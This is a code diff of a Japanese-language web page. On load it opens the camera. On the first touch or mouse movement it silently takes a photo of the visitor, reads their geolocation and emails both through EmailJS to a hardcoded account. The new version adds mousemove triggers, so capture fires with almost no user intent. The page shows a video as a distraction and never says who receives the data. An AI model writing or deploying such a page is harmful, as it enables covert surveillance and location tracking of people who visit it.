@@ -1,96 +1,133 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <title>画面タッチで撮影と送信</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: sans-serif;
-      background: #111;
-      color: #fff;
-      text-align: center;
-      padding: 20px;
-    }
-    video, canvas {
-      display: none;
-    }
-    #message {
-      margin-top: 20px;
-      font-size: 1.2rem;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>タッチで撮影＆位置情報＆動画再生＆メール送信</title>
+<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+<style>
+  body {
+    margin: 0; padding: 0;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    height: 100vh; background: #f0f0f0;
+  }
+  video#videoStream, video#playVideo {
+    max-width: 100%; max-height: 200px;
+    margin: 10px 0;
+  }
+  #status {
+    margin-top: 10px;
+    color: green;
+  }
+</style>
 </head>
 <body>
-  <h1>画面に触れてください</h1>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-  <div id="message">カメラを起動中...</div>
 
-  <!-- base64動画（必要なら差し替え） -->
-  <video id="localVideo" controls autoplay loop muted width="300"></video>
+<h2>画面に触れたら撮影＆位置情報＆動画再生＆メール送信</h2>
 
-  <!-- EmailJS SDK（ES Module版・修正済） -->
-  <script type="module">
-    import * as emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+<!-- カメラ映像 -->
+<video id="videoStream" autoplay playsinline></video>
 
-    emailjs.init("cPjKBUm_i6HebDQF7"); // ← あなたの公開鍵
+<!-- 動画再生用 -->
+<video id="playVideo" controls></video>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const message = document.getElementById('message');
-    const localVideo = document.getElementById('localVideo');
+<div id="status"></div>
 
-    // Base64 動画（短い黒画面。必要なら差し替え可）
-    const base64Video = "data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDFtcDQyaXNvbWF2YzEAAAAIZnJlZQAAAsxtZGF0AAAAAA==";
-    localVideo.src = base64Video;
+<script>
+emailjs.init('cPjKBUm_i6HebDQF7');
 
-    // カメラ起動
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        message.textContent = "画面をタップしてください";
-      })
-      .catch(err => {
-        message.textContent = "カメラエラー: " + err.message;
-      });
+const videoStream = document.getElementById('videoStream');
+const playVideo = document.getElementById('playVideo');
+const statusDiv = document.getElementById('status');
 
-    // タッチまたはクリックを1回だけ検出
-    document.body.addEventListener('touchstart', handleInteraction, { once: true });
-    document.body.addEventListener('mousedown', handleInteraction, { once: true });
+// 事前に用意したbase64動画 (mp4などをbase64に変換した文字列例)
+// 例として超短い透明動画（数秒）を使います。
+// 実際には適切なbase64動画データに置き換えてください。
+const base64VideoData = "data:video/mp4;base64,AAAAIGZ0eXBNkN2MTAwMDA=";
 
-    async function handleInteraction() {
-      message.textContent = "撮影中...";
+// カメラ映像取得開始
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    videoStream.srcObject = stream;
+  } catch (err) {
+    statusDiv.textContent = "カメラのアクセスが拒否されましたまたは利用できません";
+    console.error(err);
+  }
+}
 
-      await new Promise(resolve => setTimeout(resolve, 500)); // カメラ準備待ち
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      const photoData = canvas.toDataURL("image/png");
+// 写真を撮る（videoからcanvasへ）
+function takePhoto() {
+  const canvas = document.createElement('canvas');
+  canvas.width = videoStream.videoWidth;
+  canvas.height = videoStream.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
+  return canvas.toDataURL('image/png');  // base64の画像データ
+}
 
-      // 位置情報取得
-      const position = await getLocation();
-      const locationText = position
-        ? `緯度: ${position.coords.latitude}, 経度: ${position.coords.longitude}`
-        : "位置情報取得できませんでした";
-
-      try {
-        await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
-          message: `画面タッチイベント\n${locationText}`,
-          image_data: photoData
-        });
-        message.textContent = "送信完了！";
-      } catch (err) {
-        message.textContent = "送信失敗: " + (err.text || err.message);
-      }
+// 位置情報取得をPromise化
+function getPositionPromise() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject("位置情報取得はこのブラウザではサポートされていません");
+    } else {
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve(pos),
+        err => reject(err.message)
+      );
     }
+  });
+}
 
-    function getLocation() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
-      });
-    }
-  </script>
+// EmailJSでメール送信
+function sendEmail(photoData, latitude, longitude) {
+  // template_2fp2jrg のテンプレート変数例
+  // photo: base64画像, latitude: 緯度, longitude: 経度, video: base64動画などを入れる
+  emailjs.send('service_ja2c09x', 'template_2fp2jrg', {
+    photo: photoData,
+    latitude: latitude,
+    longitude: longitude,
+    video: base64VideoData,
+  })
+  .then(() => {
+    statusDiv.textContent = "メール送信成功！";
+  }, (error) => {
+    statusDiv.textContent = "メール送信に失敗しました。";
+    console.error(error);
+  });
+}
+
+// 画面に触れたら実行
+async function onUserTouch() {
+  statusDiv.textContent = "処理中...";
+  const photo = takePhoto();
+
+  try {
+    const pos = await getPositionPromise();
+    // 動画再生開始
+    playVideo.src = base64VideoData;
+    playVideo.play();
+
+    // メール送信
+    sendEmail(photo, pos.coords.latitude, pos.coords.longitude);
+  } catch (e) {
+    statusDiv.textContent = "位置情報取得に失敗しました: " + e;
+    console.error(e);
+  }
+}
+
+// イベントリスナー設定 (タッチ・マウス)
+function setupTouchListeners() {
+  const events = ['touchstart', 'mousedown', 'touchmove', 'mousemove'];
+  events.forEach(evt => {
+    window.addEventListener(evt, onUserTouch, { once: true }); // 1回だけ実行
+  });
+}
+
+startCamera();
+setupTouchListeners();
+</script>
+
 </body>
 </html>
